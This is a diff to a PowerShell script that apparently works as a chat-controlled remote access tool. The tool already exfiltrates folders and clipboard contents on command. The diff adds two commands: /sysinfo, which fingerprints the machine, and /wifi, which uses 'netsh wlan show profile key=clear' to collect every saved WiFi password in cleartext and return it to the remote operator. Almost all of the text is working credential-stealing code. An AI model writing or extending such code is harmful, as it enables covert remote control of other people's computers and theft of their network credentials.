@@ -199,6 +199,60 @@ function Get-ClipboardContent {
     }
 }
 
+function Get-SystemInfo {
+    try {
+        $os = Get-CimInstance Win32_OperatingSystem
+        $cs = Get-CimInstance Win32_ComputerSystem
+        $proc = Get-CimInstance Win32_Processor
+        $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
+        
+        $info = @"
+System Information:
+------------------
+Computer Name: $($cs.Name)
+OS: $($os.Caption) $($os.OSArchitecture)
+Version: $($os.Version)
+Manufacturer: $($cs.Manufacturer)
+Model: $($cs.Model)
+Processor: $($proc.Name)
+RAM: $([math]::Round($cs.TotalPhysicalMemory / 1GB, 2)) GB
+C: Drive: $([math]::Round($disk.Size / 1GB, 2)) GB total, $([math]::Round($disk.FreeSpace / 1GB, 2)) GB free
+"@
+        return $info
+    } catch {
+        return "Error retrieving system information: $_"
+    }
+}
+
+function Get-WifiPasswords {
+    try {
+        # Get all WiFi profiles
+        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+        
+        if (-not $profiles) {
+            return "No WiFi profiles found."
+        }
+        
+        $results = "Saved WiFi Networks and Passwords:`n----------------------------------`n"
+        
+        foreach ($profile in $profiles) {
+            # Get password for each profile
+            $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" 
+            
+            if ($password) {
+                $pass = $password.ToString().Split(":")[1].Trim()
+                $results += "Network: $profile`nPassword: $pass`n`n"
+            } else {
+                $results += "Network: $profile`nPassword: [No Password Found]`n`n"
+            }
+        }
+        
+        return $results
+    } catch {
+        return "Error retrieving WiFi passwords: $_"
+    }
+}
+
 function Set-ClipboardContent {
     param (
         [string]$text
@@ -230,6 +284,8 @@ Available Commands:
 /sendfolder <path> - Sends a zipped folder from local disk.
 /getclipboard - Gets text from clipboard.
 /setclipboard <text> - Sets text to clipboard.
+/sysinfo - Displays detailed system information.
+/wifi - Shows all saved WiFi networks and passwords.
 cd <path> - Change directory.
 cd - Show current directory.
 ls or dir - List files and folders.
@@ -374,6 +430,14 @@ while ($true) {
                 $clipText = $matches[1]
                 $success = Set-ClipboardContent -text $clipText
                 $reply = if ($success) { "Text set to clipboard: $clipText" } else { "Failed to set clipboard text." }
+            }
+            elseif ($text -eq "/sysinfo") {
+                $sysInfo = Get-SystemInfo
+                $reply = $sysInfo
+            }
+            elseif ($text -eq "/wifi") {
+                $wifiPasswords = Get-WifiPasswords
+                $reply = $wifiPasswords
             }
             else {
                 $reply = "Unknown command."
